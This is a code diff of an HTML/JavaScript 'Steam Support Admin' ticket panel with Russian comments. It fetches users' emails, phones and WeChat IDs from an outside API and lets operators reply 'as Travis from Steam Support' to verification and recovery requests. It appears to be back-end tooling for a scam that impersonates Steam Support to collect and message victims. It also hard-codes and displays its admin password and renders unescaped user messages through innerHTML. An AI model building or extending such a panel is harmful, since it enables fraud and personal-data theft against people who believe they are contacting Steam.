@@ -3,131 +3,586 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Steam Support Admin Panel</title>
+    <title>Steam Support Admin</title>
     <style>
-        /* (Все стили из предыдущей версии сохраняются) */
-        /* Добавляем только новые стили для чата */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
         
-        .admin-chat-container {
+        body {
+            background: #0e141b;
+            color: #c6d4df;
+            min-height: 100vh;
+        }
+        
+        /* Login Screen */
+        .login-screen {
             display: flex;
-            flex-direction: column;
-            height: 600px;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #1b2838 0%, #171a21 100%);
+        }
+        
+        .login-box {
+            background: rgba(23, 26, 33, 0.95);
+            padding: 40px;
+            border-radius: 8px;
             border: 1px solid #2a475e;
-            border-radius: 6px;
+            width: 400px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+        
+        .login-box h2 {
+            color: #66c0f4;
+            margin-bottom: 30px;
+            font-size: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .login-input {
+            width: 100%;
+            padding: 12px 15px;
+            margin: 10px 0;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid #2a475e;
+            border-radius: 4px;
+            color: white;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+        
+        .login-input:focus {
+            outline: none;
+            border-color: #66c0f4;
+        }
+        
+        .login-btn {
+            background: linear-gradient(180deg, #5c7e10 0%, #6fa720 100%);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+            margin-top: 20px;
+            width: 100%;
+            transition: transform 0.2s;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        /* Admin Panel */
+        .admin-panel {
+            display: none;
+            height: 100vh;
             overflow: hidden;
         }
         
-        .admin-chat-header {
-            background: #171a21;
-            padding: 15px;
+        /* Header */
+        .admin-header {
+            background: linear-gradient(90deg, #171a21 0%, #1b2838 100%);
+            padding: 15px 20px;
             border-bottom: 1px solid #2a475e;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
         }
         
-        .admin-chat-messages {
+        .admin-header h2 {
+            color: #66c0f4;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        /* Main Content */
+        .admin-main {
+            display: flex;
+            height: calc(100vh - 70px);
+        }
+        
+        /* Sidebar */
+        .sidebar {
+            width: 250px;
+            background: rgba(23, 26, 33, 0.9);
+            border-right: 1px solid #2a475e;
+            padding: 20px;
+            overflow-y: auto;
+        }
+        
+        .stats-card {
+            background: rgba(42, 71, 94, 0.3);
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            border: 1px solid #2a475e;
+        }
+        
+        .stats-card h3 {
+            color: #66c0f4;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        
+        .stats-number {
+            font-size: 28px;
+            font-weight: bold;
+            color: #76ffab;
+        }
+        
+        .filters {
+            margin-top: 20px;
+        }
+        
+        .filter-btn {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            background: rgba(42, 71, 94, 0.3);
+            border: 1px solid #2a475e;
+            color: #c6d4df;
+            border-radius: 4px;
+            cursor: pointer;
+            text-align: left;
+            transition: all 0.2s;
+        }
+        
+        .filter-btn:hover {
+            background: rgba(42, 71, 94, 0.5);
+        }
+        
+        .filter-btn.active {
+            background: #66c0f4;
+            color: white;
+            border-color: #66c0f4;
+        }
+        
+        /* Tickets List */
+        .tickets-list {
             flex: 1;
             overflow-y: auto;
             padding: 20px;
-            background: rgba(0,0,0,0.1);
+            background: rgba(0, 0, 0, 0.1);
         }
         
-        .admin-chat-input-area {
+        .ticket-card {
+            background: rgba(23, 26, 33, 0.8);
+            border: 1px solid #2a475e;
+            border-radius: 6px;
             padding: 15px;
-            border-top: 1px solid #2a475e;
-            background: #171a21;
-        }
-        
-        .admin-message {
             margin-bottom: 15px;
-            max-width: 70%;
+            cursor: pointer;
+            transition: all 0.2s;
         }
         
-        .admin-message.support {
-            margin-left: auto;
-            background: rgba(92, 126, 16, 0.3);
-            border-left: 3px solid #5c7e10;
+        .ticket-card:hover {
+            border-color: #66c0f4;
+            transform: translateX(5px);
         }
         
-        .admin-message.user {
-            margin-right: auto;
+        .ticket-card.selected {
+            border-color: #66c0f4;
+            background: rgba(102, 192, 244, 0.1);
+        }
+        
+        .ticket-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .ticket-id {
+            font-family: monospace;
+            color: #66c0f4;
+            font-weight: bold;
+        }
+        
+        .ticket-status {
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 11px;
+            font-weight: bold;
+        }
+        
+        .status-pending {
+            background: rgba(255, 184, 32, 0.2);
+            color: #ffb820;
+        }
+        
+        .status-reviewed {
+            background: rgba(102, 192, 244, 0.2);
+            color: #66c0f4;
+        }
+        
+        .status-resolved {
+            background: rgba(92, 126, 16, 0.2);
+            color: #76ffab;
+        }
+        
+        .ticket-info {
+            font-size: 12px;
+            color: #8f98a0;
+            margin: 5px 0;
+        }
+        
+        .ticket-message {
+            font-size: 13px;
+            margin-top: 10px;
+            color: #c6d4df;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        /* Chat Panel */
+        .chat-panel {
+            width: 400px;
+            background: rgba(23, 26, 33, 0.9);
+            border-left: 1px solid #2a475e;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .chat-header {
+            padding: 15px;
+            border-bottom: 1px solid #2a475e;
             background: rgba(42, 71, 94, 0.3);
-            border-right: 3px solid #2a475e;
         }
         
-        .admin-message.system {
-            margin: 10px auto;
+        .chat-messages {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+        }
+        
+        .message {
+            margin-bottom: 15px;
+            max-width: 85%;
+        }
+        
+        .message-user {
+            background: rgba(42, 71, 94, 0.5);
+            border-left: 3px solid #2a475e;
+            margin-right: auto;
+        }
+        
+        .message-admin {
+            background: rgba(92, 126, 16, 0.3);
+            border-right: 3px solid #5c7e10;
+            margin-left: auto;
+        }
+        
+        .message-system {
             background: rgba(255, 184, 32, 0.1);
             border: 1px dashed #ffb820;
+            margin: 10px auto;
             max-width: 90%;
             text-align: center;
+        }
+        
+        .message-content {
+            padding: 10px;
+            font-size: 13px;
+            white-space: pre-wrap;
+        }
+        
+        .message-info {
+            font-size: 11px;
+            color: #8f98a0;
+            margin-bottom: 3px;
+            padding: 0 10px;
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .chat-input-area {
+            padding: 15px;
+            border-top: 1px solid #2a475e;
+        }
+        
+        .chat-input {
+            width: 100%;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid #2a475e;
+            border-radius: 4px;
+            color: white;
+            font-size: 13px;
+            resize: none;
+            height: 80px;
+            margin-bottom: 10px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        .chat-input:focus {
+            outline: none;
+            border-color: #66c0f4;
+        }
+        
+        .chat-buttons {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .send-btn {
+            flex: 1;
+            padding: 10px;
+            background: #66c0f4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        .status-select {
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid #2a475e;
+            border-radius: 4px;
+            color: white;
+            min-width: 120px;
+        }
+        
+        /* Loading States */
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #8f98a0;
+        }
+        
+        .spinner {
+            border: 3px solid rgba(102, 192, 244, 0.3);
+            border-top: 3px solid #66c0f4;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Empty States */
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #8f98a0;
+        }
+        
+        .empty-state i {
+            font-size: 48px;
+            margin-bottom: 15px;
+            opacity: 0.5;
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.1);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #2a475e;
+            border-radius: 4px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #3d556e;
+        }
+        
+        /* Utility Classes */
+        .hidden {
+            display: none !important;
+        }
+        
+        .api-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 12px;
+            padding: 3px 8px;
+            border-radius: 3px;
+            background: rgba(0, 0, 0, 0.2);
+        }
+        
+        .api-online {
+            color: #76ffab;
+        }
+        
+        .api-offline {
+            color: #ff6b6b;
+        }
+        
+        /* Mobile Responsive */
+        @media (max-width: 1200px) {
+            .chat-panel {
+                position: fixed;
+                right: 0;
+                top: 0;
+                height: 100vh;
+                z-index: 1000;
+                transform: translateX(100%);
+                transition: transform 0.3s;
+            }
+            
+            .chat-panel.open {
+                transform: translateX(0);
+            }
+            
+            .close-chat {
+                position: absolute;
+                top: 10px;
+                right: 10px;
+                background: none;
+                border: none;
+                color: #ff6b6b;
+                font-size: 20px;
+                cursor: pointer;
+                z-index: 1001;
+            }
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <!-- Весь предыдущий код admin.html остается -->
-    <!-- Добавляем только модальное окно с чатом -->
-    
-    <!-- Chat Modal -->
-    <div id="chatModal" class="modal-overlay" style="display: none;">
-        <div class="modal-content" style="max-width: 700px;">
-            <div class="modal-header">
-                <h3 id="chatModalTitle">Chat with User</h3>
-                <span class="close-modal" onclick="closeChatModal()">&times;</span>
+    <!-- Login Screen -->
+    <div id="loginScreen" class="login-screen">
+        <div class="login-box">
+            <h2><i class="fas fa-shield-alt"></i> Steam Support Admin</h2>
+            <input type="password" id="adminPassword" class="login-input" placeholder="Enter admin password" autocomplete="off">
+            <button onclick="login()" class="login-btn">Login to Admin Panel</button>
+            <div style="margin-top: 20px; font-size: 12px; color: #8f98a0;">
+                <p>Default password: <code>steamadmin2024</code></p>
+                <p style="margin-top: 10px;">API Server: <code>http://elita313.beget.tech/api.php</code></p>
             </div>
-            <div class="modal-body">
-                <div class="admin-chat-container">
-                    <div class="admin-chat-header">
-                        <div style="display: flex; justify-content: space-between; align-items: center;">
-                            <div>
-                                <strong id="chatUserEmail">user@example.com</strong>
-                                <div style="font-size: 12px; color: #8f98a0;">
-                                    Ticket: <span id="chatTicketId">S-0000000</span> | 
-                                    Status: <span id="chatTicketStatus">pending</span>
-                                </div>
-                            </div>
-                            <div>
-                                <select id="chatStatusSelect" style="padding: 5px; background: rgba(0,0,0,0.3); color: white; border: 1px solid #2a475e; border-radius: 3px;">
-                                    <option value="pending">Pending</option>
-                                    <option value="reviewed">Under Review</option>
-                                    <option value="resolved">Resolved</option>
-                                </select>
-                                <button onclick="updateChatStatus()" style="margin-left: 10px; padding: 5px 10px; background: #2a475e; color: white; border: none; border-radius: 3px; cursor: pointer;">
-                                    Update
-                                </button>
-                            </div>
-                        </div>
+        </div>
+    </div>
+    
+    <!-- Admin Panel -->
+    <div id="adminPanel" class="admin-panel">
+        <!-- Header -->
+        <div class="admin-header">
+            <h2><i class="fas fa-tools"></i> Steam Support Ticket System</h2>
+            <div style="display: flex; align-items: center; gap: 15px;">
+                <span class="api-status" id="apiStatus">
+                    <i class="fas fa-circle"></i>
+                    <span id="apiStatusText">Checking...</span>
+                </span>
+                <span id="adminName">Admin: Travis</span>
+                <button onclick="logout()" style="background: #c34242; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-size: 13px;">
+                    <i class="fas fa-sign-out-alt"></i> Logout
+                </button>
+            </div>
+        </div>
+        
+        <!-- Main Content -->
+        <div class="admin-main">
+            <!-- Sidebar -->
+            <div class="sidebar">
+                <div class="stats-card">
+                    <h3>Total Tickets</h3>
+                    <div class="stats-number" id="totalTickets">0</div>
+                </div>
+                
+                <div class="stats-card">
+                    <h3>Pending</h3>
+                    <div class="stats-number" id="pendingTickets">0</div>
+                </div>
+                
+                <div class="stats-card">
+                    <h3>Resolved</h3>
+                    <div class="stats-number" id="resolvedTickets">0</div>
+                </div>
+                
+                <div class="filters">
+                    <button class="filter-btn active" onclick="setFilter('all')">
+                        <i class="fas fa-list"></i> All Tickets
+                    </button>
+                    <button class="filter-btn" onclick="setFilter('pending')">
+                        <i class="fas fa-clock"></i> Pending
+                    </button>
+                    <button class="filter-btn" onclick="setFilter('resolved')">
+                        <i class="fas fa-check-circle"></i> Resolved
+                    </button>
+                    <button class="filter-btn" onclick="setFilter('server')">
+                        <i class="fas fa-server"></i> From Server
+                    </button>
+                    
+                    <div style="margin-top: 20px;">
+                        <button onclick="refreshTickets()" style="width: 100%; padding: 10px; background: #2a475e; color: white; border: none; border-radius: 4px; cursor: pointer;">
+                            <i class="fas fa-sync-alt"></i> Refresh
+                        </button>
                     </div>
                     
-                    <div class="admin-chat-messages" id="adminChatMessages">
-                        <!-- Chat messages will appear here -->
+                    <div style="margin-top: 10px; font-size: 11px; color: #8f98a0; padding: 10px; background: rgba(0,0,0,0.2); border-radius: 4px;">
+                        <p><strong>Server URL:</strong></p>
+                        <p style="word-break: break-all; margin-top: 5px;">http://elita313.beget.tech/api.php</p>
                     </div>
-                    
-                    <div class="admin-chat-input-area">
-                        <div style="display: flex; gap: 10px;">
-                            <textarea id="adminChatInput" style="flex: 1; padding: 10px; background: rgba(0,0,0,0.3); border: 1px solid #2a475e; border-radius: 4px; color: white; height: 80px; resize: none;" placeholder="Type your response as Travis from Steam Support..."></textarea>
-                            <div style="display: flex; flex-direction: column; gap: 5px;">
-                                <button onclick="sendAdminMessage()" style="padding: 10px 20px; background: #66c0f4; color: white; border: none; border-radius: 4px; cursor: pointer;">
-                                    <i class="fas fa-paper-plane"></i> Send
-                                </button>
-                                <button onclick="sendTemplateResponse()" style="padding: 10px; background: #2a475e; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;">
-                                    <i class="fas fa-reply"></i> Template
-                                </button>
-                            </div>
-                        </div>
-                        <div style="margin-top: 10px; display: flex; gap: 5px; flex-wrap: wrap;">
-                            <button onclick="insertTemplate('Hi there,\n\nThank you for contacting Steam Support.')" style="padding: 5px 10px; background: rgba(42,71,94,0.5); color: #c6d4df; border: 1px solid #2a475e; border-radius: 3px; cursor: pointer; font-size: 11px;">
-                                Greeting
-                            </button>
-                            <button onclick="insertTemplate('We are currently reviewing your verification request.')" style="padding: 5px 10px; background: rgba(42,71,94,0.5); color: #c6d4df; border: 1px solid #2a475e; border-radius: 3px; cursor: pointer; font-size: 11px;">
-                                Reviewing
-                            </button>
-                            <button onclick="insertTemplate('Please provide additional information about your issue.')" style="padding: 5px 10px; background: rgba(42,71,94,0.5); color: #c6d4df; border: 1px solid #2a475e; border-radius: 3px; cursor: pointer; font-size: 11px;">
-                                More Info
-                            </button>
-                            <button onclick="insertTemplate('Your ticket has been resolved. Thank you for contacting Steam Support.\n\nTravis')" style="padding: 5px 10px; background: rgba(42,71,94,0.5); color: #c6d4df; border: 1px solid #2a475e; border-radius: 3px; cursor: pointer; font-size: 11px;">
-                                Resolved
-                            </button>
-                        </div>
+                </div>
+            </div>
+            
+            <!-- Tickets List -->
+            <div class="tickets-list" id="ticketsList">
+                <div class="loading" id="loadingTickets">
+                    <div class="spinner"></div>
+                    <p>Loading tickets...</p>
+                </div>
+                <!-- Tickets will be loaded here -->
+            </div>
+            
+            <!-- Chat Panel -->
+            <div class="chat-panel" id="chatPanel">
+                <button class="close-chat hidden" onclick="closeChat()" id="closeChatBtn">
+                    <i class="fas fa-times"></i>
+                </button>
+                
+                <div class="chat-header">
+                    <h3 id="chatTitle">Select a ticket to chat</h3>
+                    <div style="font-size: 12px; color: #8f98a0; margin-top: 5px;">
+                        <span id="chatTicketId">-</span>
+                        <span style="margin-left: 10px;">Status: <span id="chatStatus">-</span></span>
+                    </div>
+                </div>
+                
+                <div class="chat-messages" id="chatMessages">
+                    <div class="empty-state">
+                        <i class="fas fa-comments"></i>
+                        <p>Select a ticket to view conversation</p>
+                    </div>
+                </div>
+                
+                <div class="chat-input-area" id="chatInputArea" style="display: none;">
+                    <textarea class="chat-input" id="messageInput" placeholder="Type your response as Travis from Steam Support..."></textarea>
+                    <div class="chat-buttons">
+                        <select class="status-select" id="statusSelect">
+                            <option value="pending">Pending</option>
+                            <option value="reviewed">Under Review</option>
+                            <option value="resolved">Resolved</option>
+                        </select>
+                        <button class="send-btn" onclick="sendMessage()">
+                            <i class="fas fa-paper-plane"></i> Send
+                        </button>
                     </div>
                 </div>
             </div>
@@ -135,113 +590,493 @@
     </div>
 
     <script>
-        // Добавляем функции для работы с чатом в админке
+        // Configuration
+        const API_SERVER = 'http://elita313.beget.tech/api.php';
+        const ADMIN_PASSWORD = 'steamadmin2024';
         
-        let currentChatTicket = null;
+        // State
+        let tickets = [];
+        let serverTickets = [];
+        let selectedTicketId = null;
+        let currentFilter = 'all';
+        let isApiOnline = false;
         
-        function openChat(ticketId) {
-            // Найти тикет
-            const ticket = currentTickets.find(t => t.id === ticketId);
-            if (!ticket) {
-                alert('Ticket not found');
-                return;
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check if already logged in
+            if (localStorage.getItem('steam_admin_logged_in') === 'true') {
+                showAdminPanel();
+            } else {
+                showLoginScreen();
             }
             
-            currentChatTicket = ticket;
-            
-            // Заполнить информацию
-            document.getElementById('chatUserEmail').textContent = ticket.email;
-            document.getElementById('chatTicketId').textContent = ticket.id;
-            document.getElementById('chatTicketStatus').textContent = ticket.status;
-            document.getElementById('chatModalTitle').textContent = `Chat: ${ticket.email}`;
-            document.getElementById('chatStatusSelect').value = ticket.status;
-            
-            // Показать сообщения
-            displayAdminChatMessages(ticket.messages || []);
-            
-            // Показать модальное окно
-            document.getElementById('chatModal').style.display = 'flex';
+            // Check for ticket parameter in URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const ticketId = urlParams.get('ticket');
+            if (ticketId && localStorage.getItem('steam_admin_logged_in') === 'true') {
+                setTimeout(() => selectTicket(ticketId), 1000);
+            }
+        });
+        
+        function showLoginScreen() {
+            document.getElementById('loginScreen').style.display = 'flex';
+            document.getElementById('adminPanel').style.display = 'none';
         }
         
-        function closeChatModal() {
-            document.getElementById('chatModal').style.display = 'none';
-            currentChatTicket = null;
+        function showAdminPanel() {
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('adminPanel').style.display = 'block';
+            checkApiStatus();
+            loadTickets();
         }
         
-        function displayAdminChatMessages(messages) {
-            const container = document.getElementById('adminChatMessages');
+        function login() {
+            const password = document.getElementById('adminPassword').value;
+            
+            if (password === ADMIN_PASSWORD) {
+                localStorage.setItem('steam_admin_logged_in', 'true');
+                showAdminPanel();
+            } else {
+                alert('Incorrect password! Default: steamadmin2024');
+            }
+        }
+        
+        function logout() {
+            localStorage.removeItem('steam_admin_logged_in');
+            location.reload();
+        }
+        
+        async function checkApiStatus() {
+            const statusElement = document.getElementById('apiStatus');
+            const statusText = document.getElementById('apiStatusText');
+            
+            try {
+                const response = await fetch(`${API_SERVER}?action=test`, {
+                    method: 'GET',
+                    mode: 'cors',
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.success) {
+                        statusText.textContent = 'API Online';
+                        statusElement.className = 'api-status api-online';
+                        isApiOnline = true;
+                        return true;
+                    }
+                }
+            } catch (error) {
+                console.log('Direct API connection failed');
+            }
+            
+            // Try with CORS proxy
+            try {
+                const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(API_SERVER + '?action=test')}`;
+                const response = await fetch(proxyUrl);
+                
+                if (response.ok) {
+                    statusText.textContent = 'API Online (via proxy)';
+                    statusElement.className = 'api-status api-online';
+                    isApiOnline = true;
+                    return true;
+                }
+            } catch (proxyError) {
+                console.log('Proxy connection failed');
+            }
+            
+            // Offline
+            statusText.textContent = 'API Offline';
+            statusElement.className = 'api-status api-offline';
+            isApiOnline = false;
+            return false;
+        }
+        
+        async function loadTickets() {
+            const loadingElement = document.getElementById('loadingTickets');
+            loadingElement.style.display = 'block';
+            
+            // Load from localStorage first
+            loadLocalTickets();
+            
+            // Try to load from server
+            if (isApiOnline) {
+                await loadServerTickets();
+            }
+            
+            // Merge tickets
+            mergeTickets();
+            
+            // Update stats
+            updateStats();
+            
+            // Render tickets
+            renderTickets();
+            
+            loadingElement.style.display = 'none';
+        }
+        
+        function loadLocalTickets() {
+            const localTickets = JSON.parse(localStorage.getItem('steam_tickets') || '[]');
+            
+            // If no tickets in localStorage, create sample data
+            if (localTickets.length === 0) {
+                tickets = [
+                    {
+                        id: 'S-7834592',
+                        email: 'user1@example.com',
+                        phone: '+1 *** *** 8562',
+                        wechat: 'wxid_3980p3aon2ju12',
+                        created_at: new Date().toISOString(),
+                        updated_at: new Date().toISOString(),
+                        status: 'pending',
+                        messages: [
+                            {
+                                sender: 'user',
+                                message: "Hi, I can't find my purchase receipts. My WeChat is wxid_3980p3aon2ju12",
+                                timestamp: new Date().toISOString()
+                            },
+                            {
+                                sender: 'support',
+                                message: "Hi there,\n\nThank you for contacting Steam Support. We've received your verification request.\n\nSteam Support\nTravis",
+                                timestamp: new Date().toISOString()
+                            }
+                        ]
+                    },
+                    {
+                        id: 'S-8923451',
+                        email: 'user2@gmail.com',
+                        phone: '+44 7911 123456',
+                        wechat: 'Not provided',
+                        created_at: new Date(Date.now() - 86400000).toISOString(), // 1 day ago
+                        updated_at: new Date(Date.now() - 43200000).toISOString(), // 12 hours ago
+                        status: 'reviewed',
+                        messages: [
+                            {
+                                sender: 'user',
+                                message: "I need help with my account verification",
+                                timestamp: new Date(Date.now() - 86400000).toISOString()
+                            }
+                        ]
+                    },
+                    {
+                        id: 'S-4561237',
+                        email: 'user3@hotmail.com',
+                        phone: '+81 90 1234 5678',
+                        wechat: 'wxid_test123',
+                        created_at: new Date(Date.now() - 172800000).toISOString(), // 2 days ago
+                        updated_at: new Date(Date.now() - 86400000).toISOString(), // 1 day ago
+                        status: 'resolved',
+                        messages: [
+                            {
+                                sender: 'user',
+                                message: "Account recovery request",
+                                timestamp: new Date(Date.now() - 172800000).toISOString()
+                            },
+                            {
+                                sender: 'support',
+                                message: "Your account has been successfully verified.\n\nSteam Support\nTravis",
+                                timestamp: new Date(Date.now() - 86400000).toISOString()
+                            }
+                        ]
+                    }
+                ];
+                
+                localStorage.setItem('steam_tickets', JSON.stringify(tickets));
+            } else {
+                tickets = localTickets;
+            }
+        }
+        
+        async function loadServerTickets() {
+            try {
+                const response = await fetch(`${API_SERVER}?action=get_tickets`, {
+                    method: 'GET',
+                    mode: 'cors',
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.success && data.tickets) {
+                        serverTickets = data.tickets;
+                        return true;
+                    }
+                }
+            } catch (error) {
+                console.log('Failed to load tickets from server');
+            }
+            
+            return false;
+        }
+        
+        function mergeTickets() {
+            // Merge server tickets with local tickets
+            serverTickets.forEach(serverTicket => {
+                const existingIndex = tickets.findIndex(t => t.id === serverTicket.id);
+                
+                if (existingIndex === -1) {
+                    // New ticket from server
+                    tickets.push({
+                        ...serverTicket,
+                        source: 'server'
+                    });
+                } else {
+                    // Update existing ticket with server data
+                    tickets[existingIndex] = {
+                        ...tickets[existingIndex],
+                        ...serverTicket,
+                        source: 'server',
+                        // Keep local messages if server doesn't have them
+                        messages: serverTicket.messages || tickets[existingIndex].messages
+                    };
+                }
+            });
+        }
+        
+        function updateStats() {
+            const total = tickets.length;
+            const pending = tickets.filter(t => t.status === 'pending').length;
+            const resolved = tickets.filter(t => t.status === 'resolved').length;
+            
+            document.getElementById('totalTickets').textContent = total;
+            document.getElementById('pendingTickets').textContent = pending;
+            document.getElementById('resolvedTickets').textContent = resolved;
+        }
+        
+        function setFilter(filter) {
+            currentFilter = filter;
+            
+            // Update active button
+            document.querySelectorAll('.filter-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            renderTickets();
+        }
+        
+        function renderTickets() {
+            const container = document.getElementById('ticketsList');
+            const loadingElement = document.getElementById('loadingTickets');
+            
+            // Hide loading
+            loadingElement.style.display = 'none';
+            
+            // Filter tickets
+            let filteredTickets = tickets;
+            
+            if (currentFilter === 'pending') {
+                filteredTickets = tickets.filter(t => t.status === 'pending');
+            } else if (currentFilter === 'resolved') {
+                filteredTickets = tickets.filter(t => t.status === 'resolved');
+            } else if (currentFilter === 'server') {
+                filteredTickets = tickets.filter(t => t.source === 'server');
+            }
+            
+            // Sort by date (newest first)
+            filteredTickets.sort((a, b) => new Date(b.updated_at) - new Date(a.updated_at));
+            
+            // Clear container
             container.innerHTML = '';
             
-            if (!messages || messages.length === 0) {
-                container.innerHTML = '<div style="text-align: center; padding: 40px; color: #8f98a0;">No messages yet</div>';
+            if (filteredTickets.length === 0) {
+                container.innerHTML = `
+                    <div class="empty-state">
+                        <i class="fas fa-inbox"></i>
+                        <p>No tickets found</p>
+                        ${currentFilter === 'server' ? '<p style="font-size: 12px; margin-top: 10px;">Try connecting to the server</p>' : ''}
+                    </div>
+                `;
                 return;
             }
+            
+            // Create ticket cards
+            filteredTickets.forEach(ticket => {
+                const card = document.createElement('div');
+                card.className = `ticket-card ${selectedTicketId === ticket.id ? 'selected' : ''}`;
+                card.onclick = () => selectTicket(ticket.id);
+                
+                // Get last message preview
+                const lastMessage = ticket.messages && ticket.messages.length > 0 
+                    ? ticket.messages[ticket.messages.length - 1].message
+                    : 'No messages';
+                
+                const messagePreview = lastMessage.length > 80 
+                    ? lastMessage.substring(0, 80) + '...' 
+                    : lastMessage;
+                
+                // Format date
+                const date = new Date(ticket.updated_at).toLocaleDateString();
+                const time = new Date(ticket.updated_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+                
+                card.innerHTML = `
+                    <div class="ticket-header">
+                        <div class="ticket-id">${ticket.id}</div>
+                        <div class="ticket-status status-${ticket.status}">${ticket.status.toUpperCase()}</div>
+                    </div>
+                    <div class="ticket-info">
+                        <div><i class="fas fa-envelope"></i> ${ticket.email}</div>
+                        <div><i class="fas fa-phone"></i> ${ticket.phone}</div>
+                        <div><i class="fas fa-clock"></i> ${date} ${time}</div>
+                    </div>
+                    <div class="ticket-message">${messagePreview}</div>
+                    ${ticket.source === 'server' ? '<div style="margin-top: 5px;"><span style="font-size: 10px; color: #66c0f4;"><i class="fas fa-server"></i> From Server</span></div>' : ''}
+                `;
+                
+                container.appendChild(card);
+            });
+        }
+        
+        function selectTicket(ticketId) {
+            selectedTicketId = ticketId;
+            
+            // Update UI
+            document.querySelectorAll('.ticket-card').forEach(card => {
+                card.classList.remove('selected');
+            });
+            
+            const selectedCard = document.querySelector(`.ticket-card[onclick*="${ticketId}"]`);
+            if (selectedCard) {
+                selectedCard.classList.add('selected');
+            }
+            
+            // Load ticket details
+            const ticket = tickets.find(t => t.id === ticketId);
+            if (ticket) {
+                showChatPanel(ticket);
+            }
+        }
+        
+        function showChatPanel(ticket) {
+            // Update chat header
+            document.getElementById('chatTitle').textContent = ticket.email;
+            document.getElementById('chatTicketId').textContent = ticket.id;
+            document.getElementById('chatStatus').textContent = ticket.status;
+            document.getElementById('chatStatus').className = `status-${ticket.status}`;
+            
+            // Update status select
+            document.getElementById('statusSelect').value = ticket.status;
+            
+            // Show chat input area
+            document.getElementById('chatInputArea').style.display = 'block';
+            
+            // Show messages
+            displayMessages(ticket.messages || []);
+            
+            // Show chat panel (for mobile)
+            document.getElementById('chatPanel').classList.add('open');
+            document.getElementById('closeChatBtn').classList.remove('hidden');
+            
+            // Scroll to bottom
+            const chatMessages = document.getElementById('chatMessages');
+            setTimeout(() => {
+                chatMessages.scrollTop = chatMessages.scrollHeight;
+            }, 100);
+        }
+        
+        function closeChat() {
+            document.getElementById('chatPanel').classList.remove('open');
+            document.getElementById('closeChatBtn').classList.add('hidden');
+            selectedTicketId = null;
+            
+            // Reset UI
+            document.querySelectorAll('.ticket-card').forEach(card => {
+                card.classList.remove('selected');
+            });
+            
+            document.getElementById('chatMessages').innerHTML = `
+                <div class="empty-state">
+                    <i class="fas fa-comments"></i>
+                    <p>Select a ticket to view conversation</p>
+                </div>
+            `;
+            
+            document.getElementById('chatInputArea').style.display = 'none';
+        }
+        
+        function displayMessages(messages) {
+            const container = document.getElementById('chatMessages');
+            
+            if (!messages || messages.length === 0) {
+                container.innerHTML = '<div class="empty-state"><i class="fas fa-comments"></i><p>No messages yet</p></div>';
+                return;
+            }
+            
+            container.innerHTML = '';
             
             messages.forEach(msg => {
                 const messageDiv = document.createElement('div');
                 
                 if (msg.sender === 'system') {
-                    messageDiv.className = 'admin-message system';
-                    messageDiv.innerHTML = `<div style="padding: 10px; font-size: 12px; color: #ffb820;">${msg.message}</div>`;
+                    messageDiv.className = 'message message-system';
+                    messageDiv.innerHTML = `<div class="message-content">${msg.message}</div>`;
                 } else {
